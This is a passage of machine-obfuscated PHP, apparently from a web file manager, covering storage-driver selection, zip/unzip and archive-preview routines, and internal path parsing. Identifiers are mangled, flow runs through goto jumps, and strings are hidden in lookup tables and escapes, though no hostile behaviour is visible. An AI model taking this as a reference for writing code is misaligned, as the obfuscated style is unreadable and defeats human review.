$CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[435]] = $e‰ÚÌ¼šÍ; $CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[970]] = $bÇ‡¬åßª†; $bÔÅñâ… = array($b·ï–Ô±ÑÌ[986] => $b·ï–Ô±ÑÌ[992], $b·ï–Ô±ÑÌ[6] => $CÜ¤ªæˆ‚œ); } break; case KodIO::KOD_SHARE_ITEM: $bÔÅñâ… = array($b·ï–Ô±ÑÌ[986] => $b·ï–Ô±ÑÌ[993], $b·ï–Ô±ÑÌ[6] => $CÜ¤ªæˆ‚œ); $e‰ÚÌ¼šÍ = Model($b·ï–Ô±ÑÌ[528])->getInfo($CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[364]]); if ($e‰ÚÌ¼šÍ[$b·ï–Ô±ÑÌ[366]] == $b·ï–Ô±ÑÌ[464]) { $bÇ‡¬åßª† = KodIO::clear($e‰ÚÌ¼šÍ[$b·ï–Ô±ÑÌ[991]] . $CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[984]]); $CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[435]] = $e‰ÚÌ¼šÍ; $CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[970]] = $bÇ‡¬åßª†; $bÔÅñâ… = array($b·ï–Ô±ÑÌ[986] => $b·ï–Ô±ÑÌ[994], $b·ï–Ô±ÑÌ[6] => $CÜ¤ªæˆ‚œ); } break; default: $bÇ‡¬åßª† = $CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[76]]; $bÔÅñâ… = array($b·ï–Ô±ÑÌ[986] => $b·ï–Ô±ÑÌ[995]); break; } $fÕƒ¤á”îÏ = $CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[76]]; if (!isset(self::$driverCache[$fÕƒ¤á”îÏ])) { $Eİ¦ŠÖ–Ñà = $b·ï–Ô±ÑÌ[72] . self::driverType($bÔÅñâ…[$b·ï–Ô±ÑÌ[89]]); if (!class_exists($Eİ¦ŠÖ–Ñà)) { show_json("{$Eİ¦ŠÖ–Ñà}\40\156\x6f\x74\40\x65\170\151\x73\164\x73\x21", !1); } $f¢ŒöìŸ = isset($bÔÅñâ…[$b·ï–Ô±ÑÌ[6]]) ? $bÔÅñâ…[$b·ï–Ô±ÑÌ[6]] : !1; self::$driverCache[$fÕƒ¤á”îÏ] = new $Eİ¦ŠÖ–Ñà($f¢ŒöìŸ); } goto c¬ÑŞÕÓí¨; Bó±¹¡å¹: if (isset($bÔÅñâ…[$b·ï–Ô±ÑÌ[6]][$b·ï–Ô±ÑÌ[996]])) { $Dæ£Ü‹™†Ø->pathBase = rtrim($bÔÅñâ…[$b·ï–Ô±ÑÌ[6]][$b·ï–Ô±ÑÌ[996]], $b·ï–Ô±ÑÌ[8]) . $b·ï–Ô±ÑÌ[8]; $bÇ‡¬åßª† = $Dæ£Ü‹™†Ø->pathBase . ltrim($bÇ‡¬åßª†, $b·ï–Ô±ÑÌ[8]); } $bÇ‡¬åßª† = $Dæ£Ü‹™†Ø->getPath($bÇ‡¬åßª†); if (isset($CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[970]])) { $bÇ‡¬åßª† = $CÜ¤ªæˆ‚œ[$b·ï–Ô±ÑÌ[970]]; } goto f¨÷¿Ö‚; c§¦Ş° ÆÈ: } private static function driverType($e°——ˆŠÓ›) { $e•¡µ¬¶ï =& $_SERVER[÷ÖêïÔÔÓ]; $e°——ˆŠÓ› = strtolower($e°——ˆŠÓ›); if ($e°——ˆŠÓ› == $e•¡µ¬¶ï[65]) { $e°——ˆŠÓ› = $e•¡µ¬¶ï[997]; } else { if (in_array($e°——ˆŠÓ›, array($e•¡µ¬¶ï[102], $e•¡µ¬¶ï[58], $e•¡µ¬¶ï[998]))) { $e°——ˆŠÓ› = ucfirst($e°——ˆŠÓ›); } else { $e°——ˆŠÓ› = strtoupper($e°——ˆŠÓ›); } } return $e°——ˆŠÓ›; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $D»™¨øËÓ¤; if (!$D»™¨øËÓ¤) { $a‡Ä£õ‘Åº = IO::init($_SERVER[÷ÖêïÔÔÓ][8]); } return $a‡Ä£õ‘Åº; } private static function iconvSystem($AÚ½µ¾‚ÃÖ) { return self::local()->iconvSystem($AÚ½µ¾‚ÃÖ); } private static function iconvApp($f×‹¥©¨×›) { return self::local()->iconvApp($f×‹¥©¨×›); } public static function zip($f§ùøò†Ñ†, $Fôø¾Ùæ¸ = "\172\x69\160", $B¸‘÷Û£Ğî = '', $D—ëß±Û‘ = REPEAT_RENAME) { goto Aßöåñ‰Äí; dÚ™‹Åï: if (!$Bïæíïá¼) { del_dir($a²µŸÔ¬·); show_json(LNG($böâÓáˆ´ˆ[1001]), !1); } del_dir($a²µŸÔ¬·); return $Bïæíïá¼; goto Bµ„ÅÆ‡¦¼; ešóÄÅ÷: foreach ($fÇËÛŠ–½´ as $CÅ‹êñœ…« => $bÁóÙÌ£) { $fÇËÛŠ–½´[$CÅ‹êñœ…«] = self::iconvSystem($bÁóÙÌ£); } KodArchive::create($b¡Ú¬–‰â, $fÇËÛŠ–½´); if (!IO::exist($e³¤âÚÊˆ)) { if ($a²µŸÔ¬·) { del_dir($a²µŸÔ¬·); } show_json(LNG($böâÓáˆ´ˆ[1001]), !1); } goto a†Ÿš­ˆù‹; A„¥Åùî±: $e³¤âÚÊˆ = $E÷¼˜‰²Õï . $fĞ¢®Ò‘¶ . $böâÓáˆ´ˆ[92] . $Fôø¾Ùæ¸; $e³¤âÚÊˆ = get_filename_auto($e³¤âÚÊˆ, $böâÓáˆ´ˆ[33], $D—ëß±Û‘); $b¡Ú¬–‰â = self::iconvSystem($e³¤âÚÊˆ); goto ešóÄÅ÷; Aßöåñ‰Äí: $böâÓáˆ´ˆ =& $_SERVER[÷ÖêïÔÔÓ]; $aôè°¹Şæº = self::init($f§ùøò†Ñ†[0][$böâÓáˆ´ˆ[76]]); $f³Æ´‡©¡í = self::info($f§ùøò†Ñ†[0][$böâÓáˆ´ˆ[76]]); goto cøÎÌÎÖ¨; eÎÃÌ£ˆ¼: if (count($fÇËÛŠ–½´) > 1) { $bÍ‰³‡°¬Ö = IO::info(IO::pathFather($f³Æ´‡©¡í[$böâÓáˆ´ˆ[76]])); $fĞ¢®Ò‘¶ = $bÍ‰³‡°¬Ö[$böâÓáˆ´ˆ[28]]; } $E÷¼˜‰²Õï = $a²µŸÔ¬·; if (!$E÷¼˜‰²Õï) { $E÷¼˜‰²Õï = get_path_father($f³Æ´‡©¡í[$böâÓáˆ´ˆ[76]]); $Añ×ËÌÍù² = IO::info($E÷¼˜‰²Õï); if (!$Añ×ËÌÍù²[$böâÓáˆ´ˆ[186]]) { show_json(LNG($böâÓáˆ´ˆ[1000]), !1); } } goto A„¥Åùî±; cøÎÌÎÖ¨: $a²µŸÔ¬· = !1; if (!$B¸‘÷Û£Ğî && $aôè°¹Şæº->getType() == $böâÓáˆ´ˆ[102]) { $fÇËÛŠ–½´ = self::zipFileList($f§ùøò†Ñ†); } else { $a²µŸÔ¬· = $B¸‘÷Û£Ğî ? $B¸‘÷Û£Ğî : TEMP_FILES . $böâÓáˆ´ˆ[999] . time() . rand_string(8) . $böâÓáˆ´ˆ[8]; mk_dir($a²µŸÔ¬·); $fÇËÛŠ–½´ = self::zipFileList($f§ùøò†Ñ†, $a²µŸÔ¬·); } $fĞ¢®Ò‘¶ = $f³Æ´‡©¡í[$böâÓáˆ´ˆ[28]]; goto eÎÃÌ£ˆ¼; a†Ÿš­ˆù‹: if ($B¸‘÷Û£Ğî || !$a²µŸÔ¬·) { if ($a²µŸÔ¬· && strstr($a²µŸÔ¬·, TEMP_FILES)) { $aÜ¯ï•©Ì = $fÇËÛŠ–½´ = array(); recursion_dir($E÷¼˜‰²Õï, $aÜ¯ï•©Ì, $fÇËÛŠ–½´, 0); foreach ($aÜ¯ï•©Ì as $F‚­¬²š†) { del_dir($F‚­¬²š†); } foreach ($fÇËÛŠ–½´ as $DÈ©äŒë¬«) { if ($DÈ©äŒë¬« == $b¡Ú¬–‰â) { continue; } del_file($DÈ©äŒë¬«); } } return $e³¤âÚÊˆ; } $dˆ±ˆŠùÖª = self::pathFather($f³Æ´‡©¡í[$böâÓáˆ´ˆ[76]]); $Bïæíïá¼ = self::move($e³¤âÚÊˆ, $dˆ±ˆŠùÖª, $D—ëß±Û‘); goto dÚ™‹Åï; Bµ„ÅÆ‡¦¼: } public static function unzip($f†í¸…Õå, $BªòÅİ¬³Ì = "\x72\145\160\154\x61\143\145") { goto dÓí„ÔÑŠ„; E½†ÂÅµ¥: if (!($aî³—÷ğ¦° = parent::info($EÈÜØáê»))) { show_json(LNG($A›¹Ù¨Å–œ[1003]), !1); } if (!($b©¦é ÜÅ = parent::infoFull($fÕøİŞ¨ˆŒ))) { $fÕøİŞ¨ˆŒ = parent::mkdir($fÕøİŞ¨ˆŒ); $b©¦é ÜÅ = array($A›¹Ù¨Å–œ[76] => $fÕøİŞ¨ˆŒ); } else { if (isset($b©¦é ÜÅ[$A›¹Ù¨Å–œ[366]]) && trim($b©¦é ÜÅ[$A›¹Ù¨Å–œ[76]], $A›¹Ù¨Å–œ[8]) != trim($fÕøİŞ¨ˆŒ, $A›¹Ù¨Å–œ[8])) { $DçŒ†ù‚¨£ = KodIO::make($b©¦é ÜÅ[$A›¹Ù¨Å–œ[457]]); $câ…§˜ù„ = parent::fileNameAuto($DçŒ†ù‚¨£, $b©¦é ÜÅ[$A›¹Ù¨Å–œ[28]], REPEAT_RENAME_FOLDER, !0); $fÕøİŞ¨ˆŒ = parent::mkdir($DçŒ†ù‚¨£ . $câ…§˜ù„); $b©¦é ÜÅ = array($A›¹Ù¨Å–œ[76] => $fÕøİŞ¨ˆŒ); } } $fÕøİŞ¨ˆŒ = $b©¦é ÜÅ[$A›¹Ù¨Å–œ[76]]; goto f´“½¯²Â; dÓí„ÔÑŠ„: $A›¹Ù¨Å–œ =& $_SERVER[÷ÖêïÔÔÓ]; $EÈÜØáê» = $f†í¸…Õå[$A›¹Ù¨Å–œ[76]]; $fÕøİŞ¨ˆŒ = $f†í¸…Õå[$A›¹Ù¨Å–œ[1002]]; goto E½†ÂÅµ¥; DÎİ³ï™: $Få±İğØÀ¿ = self::iconvSystem($Få±İğØÀ¿); $eè‹Ñ¬Å = isset($f†í¸…Õå[$A›¹Ù¨Å–œ[1004]]) ? $f†í¸…Õå[$A›¹Ù¨Å–œ[1004]] : $A›¹Ù¨Å–œ[1005]; $dÙäö›‘ñ = KodArchive::extract($Få±İğØÀ¿, $DĞ‡ö¤Õ»“ . $A›¹Ù¨Å–œ[8], $eè‹Ñ¬Å); goto eå“ÜÇÚ‹; a¬º¨ø³È: mk_dir($DĞ‡ö¤Õ»“); $Få±İğØÀ¿ = $DĞ‡ö¤Õ»“ . $A›¹Ù¨Å–œ[92] . $aî³—÷ğ¦°[$A›¹Ù¨Å–œ[157]]; if (!@file_exists(self::iconvSystem($Få±İğØÀ¿))) { $f¸æ·³«Œ‹ = self::localFilePath($EÈÜØáê», $aî³—÷ğ¦°[$A›¹Ù¨Å–œ[157]]); $Få±İğØÀ¿ = $f¸æ·³«Œ‹ ? $f¸æ·³«Œ‹ : parent::download($EÈÜØáê», $Få±İğØÀ¿); } goto DÎİ³ï™; A•‹›×•†Ğ: del_dir($DĞ‡ö¤Õ»“); if (!$f¸æ·³«Œ‹) { del_file($Få±İğØÀ¿); } return !0; goto fˆÄßÁä†ë; eå“ÜÇÚ‹: self::archiveExt(); if (!$dÙäö›‘ñ[$A›¹Ù¨Å–œ[1006]]) { show_json($A›¹Ù¨Å–œ[1007] . $dÙäö›‘ñ[$A›¹Ù¨Å–œ[1008]], !1); } Hook::trigger($A›¹Ù¨Å–œ[1009], $DĞ‡ö¤Õ»“); goto BùŸÆ­›¥ƒ; BùŸÆ­›¥ƒ: recursion_dir($DĞ‡ö¤Õ»“, $a‡ïëàøºÙ, $D¢Õô¸ˆÁ, 0); $F´ÀíÈ“Ö = array_merge($a‡ïëàøºÙ, $D¢Õô¸ˆÁ); foreach ($F´ÀíÈ“Ö as $bî•Œ×ó¥ˆ) { $bî•Œ×ó¥ˆ = self::iconvApp($bî•Œ×ó¥ˆ); self::move($bî•Œ×ó¥ˆ, $fÕøİŞ¨ˆŒ, $BªòÅİ¬³Ì); } goto A•‹›×•†Ğ; f´“½¯²Â: $f¡‡÷ªÑƒ½ = self::tmpFileName($aî³—÷ğ¦°); $DĞ‡ö¤Õ»“ = TEMP_FILES . $f¡‡÷ªÑƒ½; del_dir($DĞ‡ö¤Õ»“); goto a¬º¨ø³È; fˆÄßÁä†ë: } public static function unzipList($c™ï“ó‰¹) { goto eÒ³ñÖ÷ö§; eÒ³ñÖ÷ö§: $fö¨Øô«ã– =& $_SERVER[÷ÖêïÔÔÓ]; $dôÇ©¾ÆÌ = $c™ï“ó‰¹[$fö¨Øô«ã–[76]]; $e…‰ŠÓ¡‘É = isset($c™ï“ó‰¹[$fö¨Øô«ã–[1010]]) ? $c™ï“ó‰¹[$fö¨Øô«ã–[1010]] : -1; goto DÔÁĞ”ÃÆÖ; DÔÁĞ”ÃÆÖ: $CÖ‰Õ¥»¢ê = 50000; if (request_url_safe($dôÇ©¾ÆÌ)) { $E”¨ºğã­Ô = parse_url_query($dôÇ©¾ÆÌ); if (!isset($E”¨ºğã­Ô[$fö¨Øô«ã–[76]])) { show_json($fö¨Øô«ã–[1011], !1); } } $a•è‘Šòà = isset($E”¨ºğã­Ô) ? $E”¨ºğã­Ô[$fö¨Øô«ã–[76]] : $dôÇ©¾ÆÌ; goto f¥ˆòÀØÉ; EîÃ¥äÆÓÇ: self::setContent($CíÉò‘Êó, $dß“İâ«†); if (count($EùÌë´ŒÆß[$fö¨Øô«ã–[1008]]) >= $CÖ‰Õ¥»¢ê) { show_json(sprintf(LNG($fö¨Øô«ã–[1012]), count($EùÌë´ŒÆß[$fö¨Øô«ã–[1008]])), !1); } return $EùÌë´ŒÆß[$fö¨Øô«ã–[1008]]; goto F«Ï´ôŒÄí; f¥ˆòÀØÉ: $e¬ÖÔ±Ú‘° = self::info($a•è‘Šòà); $Dù—É¯´Ç = self::tmpFileName($e¬ÖÔ±Ú‘°); if (isset($E”¨ºğã­Ô)) { $dï²‡¾Æ§ = array($E”¨ºğã­Ô[$fö¨Øô«ã–[76]], $E”¨ºğã­Ô[$fö¨Øô«ã–[1010]], $E”¨ºğã­Ô[$fö¨Øô«ã–[28]]); $bà‘£ù•à = md5(implode($fö¨Øô«ã–[71], $dï²‡¾Æ§)) . $fö¨Øô«ã–[92] . get_path_ext($E”¨ºğã­Ô[$fö¨Øô«ã–[28]]); } else { $dï²‡¾Æ§ = array($e¬ÖÔ±Ú‘°[$fö¨Øô«ã–[28]], $e¬ÖÔ±Ú‘°[$fö¨Øô«ã–[76]], $e¬ÖÔ±Ú‘°[$fö¨Øô«ã–[78]]); $bà‘£ù•à = md5(implode($fö¨Øô«ã–[71], $dï²‡¾Æ§)) . $fö¨Øô«ã–[92] . $e¬ÖÔ±Ú‘°[$fö¨Øô«ã–[157]]; } goto bƒÈö„¡„ğ; F‘ÆÂÉ‡Òí: $Eó½¶è§Éé = $Aíô×–Â . $fö¨Øô«ã–[8] . $bà‘£ù•à; if (!@file_exists(self::iconvSystem($Eó½¶è§Éé))) { if (isset($E”¨ºğã­Ô)) { url_request($dôÇ©¾ÆÌ, $fö¨Øô«ã–[1013], $Eó½¶è§Éé); } else { $A‘Ş¥¨ = self::localFilePath($dôÇ©¾ÆÌ, $e¬ÖÔ±Ú‘°[$fö¨Øô«ã–[157]]); $Eó½¶è§Éé = $A‘Ş¥¨ ? $A‘Ş¥¨ : self::download($dôÇ©¾ÆÌ, $Eó½¶è§Éé); } } $Eó½¶è§Éé = self::iconvSystem($Eó½¶è§Éé); goto eÀâ™‡â; bƒÈö„¡„ğ: if ($e…‰ŠÓ¡‘É == -1) { $CíÉò‘Êó = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\x56\x69\x65\x77\57{$Dù—É¯´Ç}\x2f{$bà‘£ù•à}\x2e\x6c\x6f\147"; $F®šŸ„Ò = self::infoFull($CíÉò‘Êó); if ($F®šŸ„Ò) { $CíÉò‘Êó = $F®šŸ„Ò[$fö¨Øô«ã–[76]]; $e¥ä‘‰×š = self::getContent($CíÉò‘Êó); if ($e¥ä‘‰×š) { $dß“İâ«† = json_decode($e¥ä‘‰×š, !0); if (count($dß“İâ«†) >= $CÖ‰Õ¥»¢ê) { show_json(sprintf(LNG($fö¨Øô«ã–[1012]), count($dß“İâ«†)), !1); } return $dß“İâ«†; } } else { $CíÉò‘Êó = self::mkfile($CíÉò‘Êó); } } $Aíô×–Â = TEMP_FILES . $Dù—É¯´Ç; if (!is_dir($Aíô×–Â)) { mk_dir($Aíô×–Â); } goto F‘ÆÂÉ‡Òí; e¦ÊˆÖÌ¤: del_dir($Aíô×–Â); if (!$EùÌë´ŒÆß[$fö¨Øô«ã–[1006]]) { show_json($EùÌë´ŒÆß[$fö¨Øô«ã–[1008]], !1); } $dß“İâ«† = json_encode($EùÌë´ŒÆß[$fö¨Øô«ã–[1008]]); goto EîÃ¥äÆÓÇ; eÀâ™‡â: if ($e…‰ŠÓ¡‘É >= 0) { $FÁç†‡åí = isset($c™ï“ó‰¹[$fö¨Øô«ã–[1014]]) ? $c™ï“ó‰¹[$fö¨Øô«ã–[1014]] : !1; $bòøƒé˜¬¬ = isset($c™ï“ó‰¹[$fö¨Øô«ã–[28]]) ? $c™ï“ó‰¹[$fö¨Øô«ã–[28]] : $fö¨Øô«ã–[33]; KodArchive::filePreview($Eó½¶è§Éé, $e…‰ŠÓ¡‘É, $FÁç†‡åí, $bòøƒé˜¬¬); self::archiveExt(); die; } $EùÌë´ŒÆß = KodArchive::listContent($Eó½¶è§Éé); self::archiveExt(); goto e¦ÊˆÖÌ¤; F«Ï´ôŒÄí: } private static function zipFileList($C¡ÓÕÙÜ©, $E’è˜òÁ¶§ = false) { $fÉ®ãï½Ø =& $_SERVER[÷ÖêïÔÔÓ]; $fÒå…·Ù’ = array(); foreach ($C¡ÓÕÙÜ© as $A„ç†£²â) { $e……ñ‡Ô¨ = $A„ç†£²â[$fÉ®ãï½Ø[76]]; if ($E’è˜òÁ¶§) { $e……ñ‡Ô¨ = self::copy($A„ç†£²â[$fÉ®ãï½Ø[76]], $E’è˜òÁ¶§, $fÉ®ãï½Ø[740]); } if ($e……ñ‡Ô¨ && self::local()->exist($e……ñ‡Ô¨)) { $fÒå…·Ù’[$A„ç†£²â[$fÉ®ãï½Ø[76]]] = $e……ñ‡Ô¨; } } if (!empty($fÒå…·Ù’)) { return array_values($fÒå…·Ù’); } show_json(LNG($fÉ®ãï½Ø[1015]), !1); } public static function tmpFileName($a¨èŞ„Œ½) { $cÓ‚¢é±í =& $_SERVER[÷ÖêïÔÔÓ]; $aå•ó…ŠŠ = array($a¨èŞ„Œ½[$cÓ‚¢é±í[28]], $a¨èŞ„Œ½[$cÓ‚¢é±í[76]], $a¨èŞ„Œ½[$cÓ‚¢é±í[78]], $a¨èŞ„Œ½[$cÓ‚¢é±í[455]]); return md5(implode($cÓ‚¢é±í[71], $aå•ó…ŠŠ)); } private static function localFilePath($eÃèíìŸ®Â, $fî¬¸í„¶º) { goto d¡¢©—ƒñ; F×£¦³š÷: if ($D¦ŠÛ÷¯Ü[$BÅÙî”±…À[29]] == KodIO::KOD_SOURCE) { $C²ÅÑ¹Ä¨á = Model($BÅÙî”±…À[748])->fileInfoGet(KodIO::sourceID($eÃèíìŸ®Â)); if (!$C²ÅÑ¹Ä¨á[$BÅÙî”±…À[76]]) { show_json($BÅÙî”±…À[1018], !1); } $eÃèíìŸ®Â = $C²ÅÑ¹Ä¨á[$BÅÙî”±…À[76]]; } $cí‘Ï£Ş‚ä = self::init($eÃèíìŸ®Â); $E±”™”Ã“Å = $cí‘Ï£Ş‚ä->getType(); goto aŠ„Ïğ»Ğ½; aŠ„Ïğ»Ğ½: if ($E±”™”Ã“Å == $BÅÙî”±…À[102] || $E±”™”Ã“Å == $BÅÙî”±…À[1019]) { if (!$cí‘Ï£Ş‚ä->exist($cí‘Ï£Ş‚ä->path)) { show_json(LNG($BÅÙî”±…À[101]), !1); } return $cí‘Ï£Ş‚ä->path; } return !1; goto CÚÌëˆÂó; d¡¢©—ƒñ: $BÅÙî”±…À =& $_SERVER[÷ÖêïÔÔÓ]; if ($fî¬¸í„¶º == $BÅÙî”±…À[1016] && strtoupper(substr(PHP_OS, 0, 3)) == $BÅÙî”±…À[1017]) { return !1; } $D¦ŠÛ÷¯Ü = KodIO::parse($eÃèíìŸ®Â); goto F×£¦³š÷; CÚÌëˆÂó: } private static function archiveExt($BÍø™ÈÚš“ = '') { $GLOBALS[$_SERVER[÷ÖêïÔÔÓ][1020]] = $BÍø™ÈÚš“; } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\165\162\x63\x65\175"; const KOD_USER_RECYCLE = "\173\x75\x73\145\x72\122\145\x63\x79\x63\154\145\175"; const KOD_USER_FAV = "\173\x75\x73\x65\x72\106\141\x76\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\x72\106\151\x6c\145\124\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\x69\154\x65\x54\x79\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\165\x70\122\x6f\157\164\123\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\162\x53\x68\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\162\123\150\x61\x72\x65\114\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\x72\145\124\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\163\150\x61\x72\x65\111\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\150\141\162\145\111\x74\x65\155\114\x69\x6e\x6b\x7d"; const KOD_SEARCH = "\x7b\x73\145\141\x72\143\150\175"; const KOD_BLOCK = "\173\142\x6c\157\143\153\175"; const KOD_IO = "\x7b\x69\157\x7d"; const KOD_USER_RECENT = "\173\165\163\145\x72\122\145\x6e\x63\145\x6e\164\x7d"; const KOD_USER_DRIVER = "\173\165\163\145\x72\104\162\x69\166\x65\162\x7d"; public static function typeList() { $Dê‘ó’‰Í =& $_SERVER[÷ÖêïÔÔÓ]; return array($Dê‘ó’‰Í[1021] => self::KOD_SOURCE, $Dê‘ó’‰Í[1022] => self::KOD_USER_RECYCLE, $Dê‘ó’‰Í[1023] => self::KOD_USER_FAV, $Dê‘ó’‰Í[1024] => self::KOD_USER_FILE_TAG, $Dê‘ó’‰Í[1025] => self::KOD_USER_FILE_TYPE, $Dê‘ó’‰Í[1026] => self::KOD_GROUP_ROOT_SELF, $Dê‘ó’‰Í[1027] => self::KOD_USER_SHARE, $Dê‘ó’‰Í[1028] => self::KOD_USER_SHARE_LINK, $Dê‘ó’‰Í[1029] => self::KOD_USER_SHARE_TO_ME, $Dê‘ó’‰Í[1030] => self::KOD_SHARE_ITEM, $Dê‘ó’‰Í[1031] => self::KOD_SHARE_LINK, $Dê‘ó’‰Í[1032] => self::KOD_SEARCH, $Dê‘ó’‰Í[1033] => self::KOD_BLOCK, $Dê‘ó’‰Í[1034] => self::KOD_IO, $Dê‘ó’‰Í[1035] => self::KOD_USER_RECENT, $Dê‘ó’‰Í[1036] => self::KOD_USER_DRIVER); } public static function parse($fØ¦Óòö»´) { goto c°ùÒšøïÏ; c°ùÒšøïÏ: $bù—â¸—®¥ =& $_SERVER[÷ÖêïÔÔÓ]; $fØ¦Óòö»´ = self::clear($fØ¦Óòö»´); $eï™ñğÊ± = array_values(self::typeList()); goto d„È—ğß¶Ÿ; c²ëñòïİ¸: return $c ¨â…¢Â; goto dá•çŠê†; d„È—ğß¶Ÿ: preg_match($bù—â¸—®¥[1037], $fØ¦Óòö»´, $E•®Ø‡‹´Ò); $c ¨â…¢Â = array($bù—â¸—®¥[385] => !1, $bù—â¸—®¥[1038] => !1, $bù—â¸—®¥[382] => !1, $bù—â¸—®¥[76] => $fØ¦Óòö»´, $bù—â¸—®¥[985] => !1, $bù—â¸—®¥[984] => $bù—â¸—®¥[33]); if (is_array($E•®Ø‡‹´Ò) && count($E•®Ø‡‹´Ò) == 5) { $EÒ¸¦İÈ‘İ = $bù—â¸—®¥[1039] . $E•®Ø‡‹´Ò[2] . $bù—â¸—®¥[312]; if (in_array($EÒ¸¦İÈ‘İ, $eï™ñğÊ±)) { $c ¨â…¢Â[$bù—â¸—®¥[985]] = $E•®Ø‡‹´Ò[1]; $c ¨â…¢Â[$bù—â¸—®¥[29]] = $EÒ¸¦İÈ‘İ; $c ¨â…¢Â[$bù—â¸—®¥[1040]] = substr($EÒ¸¦İÈ‘İ, 1, -1); $c ¨â…¢Â[$bù—â¸—®¥[364]] = $E•®Ø‡‹´Ò[3]; } $c ¨â…¢Â[$bù—â¸—®¥[984]] = $E•®Ø‡‹´Ò[4]; } goto c²ëñòïİ¸; dá•çŠê†: } public static function clear($EÕÀÊ–¬Œ) { goto A³¶‹÷êî­; CÑ‘¹µ¨¨‹: if ($EÕÀÊ–¬Œ == $EƒáÑ•ÈóÊ[8]) { return $EƒáÑ•ÈóÊ[8]; } $EÕÀÊ–¬Œ = rtrim($EÕÀÊ–¬Œ, $EƒáÑ•ÈóÊ[8]); return $EÕÀÊ–¬Œ; goto A‰é§šÏ¥; cãĞˆ‡„ËĞ: if (substr($EÕÀÊ–¬Œ, 0, 3) == $EƒáÑ•ÈóÊ[1042]) { $EÕÀÊ–¬Œ = substr($EÕÀÊ–¬Œ, 3); } while (strstr($EÕÀÊ–¬Œ, $Ašé‡ˆšöœ)) { $EÕÀÊ–¬Œ = str_replace($Ašé‡ˆšöœ, $EƒáÑ•ÈóÊ[8], $EÕÀÊ–¬Œ); } $EÕÀÊ–¬Œ = preg_replace($EƒáÑ•ÈóÊ[1043], $EƒáÑ•ÈóÊ[8], $EÕÀÊ–¬Œ); goto CÑ‘¹µ¨¨‹; A³¶‹÷êî­: $EƒáÑ•ÈóÊ =& $_SERVER[÷ÖêïÔÔÓ]; $EÕÀÊ–¬Œ = str_replace($EƒáÑ•ÈóÊ[94], $EƒáÑ•ÈóÊ[8], $EÕÀÊ–¬Œ); $Ašé‡ˆšöœ = $EƒáÑ•ÈóÊ[1041]; goto cãĞˆ‡„ËĞ; A‰é§šÏ¥: } public static function sourceID($dõÅêÉ¿¼¤) { $döø°óŒˆÕ =& $_SERVER[÷ÖêïÔÔÓ]; $c…«¬ƒ¶´¨ = self::parse($dõÅêÉ¿¼¤); if ($c…«¬ƒ¶´¨[$döø°óŒˆÕ[29]] !== self::KOD_SOURCE) { show_json(LNG($döø°óŒˆÕ[1044]), !1); } return $c…«¬ƒ¶´¨[$döø°óŒˆÕ[364]]; } public static function make($EÙ¾œ’†£à) { if (!$EÙ¾œ’†£à) { return !1; } return self::makePath(self::KOD_SOURCE, intval($EÙ¾œ’†£à)); } public static function makeShare($f³‚Ø¬«, $EŠŒŸ¹½ğ) { return self::makePath(self::KOD_SHARE_ITEM, $f³‚Ø¬«, $EŠŒŸ¹½ğ); } public static function makeFileTypePath($bÆŠäØÌ„Û) { return self::makePath(self::KOD_USER_FILE_TYPE, $bÆŠäØÌ„Û); } public static function makeFileTagPath($E‘æØ£İ½¥) { return self::makePath(self::KOD_USER_FILE_TAG, $E‘æØ£İ½¥); } public static function makePath($f·¤…¨™Ş, $b±‚ÛçêÙ£ = '', $c•‘Äñ¼Ö  = '') { $Cõ”Ø‹Ûµ‘ =& $_SERVER[÷ÖêïÔÔÓ]; $BÎ’î´ÑµÍ = substr($f·¤…¨™Ş, 1, -1); $fèÁÑ¨¢ê = $Cõ”Ø‹Ûµ‘[1045] . $BÎ’î´ÑµÍ . $Cõ”Ø‹Ûµ‘[721] . $b±‚ÛçêÙ£ . $Cõ”Ø‹Ûµ‘[1046]; $fèÁÑ¨¢ê = $c•‘Äñ¼Ö  ? $fèÁÑ¨¢ê . $c•‘Äñ¼Ö  . $Cõ”Ø‹Ûµ‘[8] : $fèÁÑ¨¢ê; return $fèÁÑ¨¢ê; } public static function hashPath($cÂÒ†Äê¨Š) { $C²õÄÃóƒç =& $_SERVER[÷ÖêïÔÔÓ]; $A¨ÚÈ‹äÍ‚ = is_array($cÂÒ†Äê¨Š) ? $cÂÒ†Äê¨Š : IO::info($cÂÒ†Äê¨Š); $c‡âšŸ§¾ = _get($A¨ÚÈ‹äÍ‚, $C²õÄÃóƒç[1047], $C²õÄÃóƒç[33]); if (!$c‡âšŸ§¾) { $bÃÒŸ£”„µ = KodIO::parse($A¨ÚÈ‹äÍ‚[$C²õÄÃóƒç[76]]); if (!$bÃÒŸ£”„µ[$C²õÄÃóƒç[29]]) { $c‡âšŸ§¾ = IO::hashSimple($A¨ÚÈ‹äÍ‚[$C²õÄÃóƒç[76]]); } } if (!$c‡âšŸ§¾) { $c‡âšŸ§¾ = md5($A¨ÚÈ‹äÍ‚[$C²õÄÃóƒç[76]] . $A¨ÚÈ‹äÍ‚[$C²õÄÃóƒç[78]] . $A¨ÚÈ‹äÍ‚[$C²õÄÃóƒç[106]]); } return $c‡âšŸ§¾; } public static function initSystemPath() { $EæÀ¶¾ÑƒÉ =& $_SERVER[÷ÖêïÔÔÓ]; $a•¡Ã†¬Ã® = array($EæÀ¶¾ÑƒÉ[1048] => $EæÀ¶¾ÑƒÉ[1049], $EæÀ¶¾ÑƒÉ[1050] => 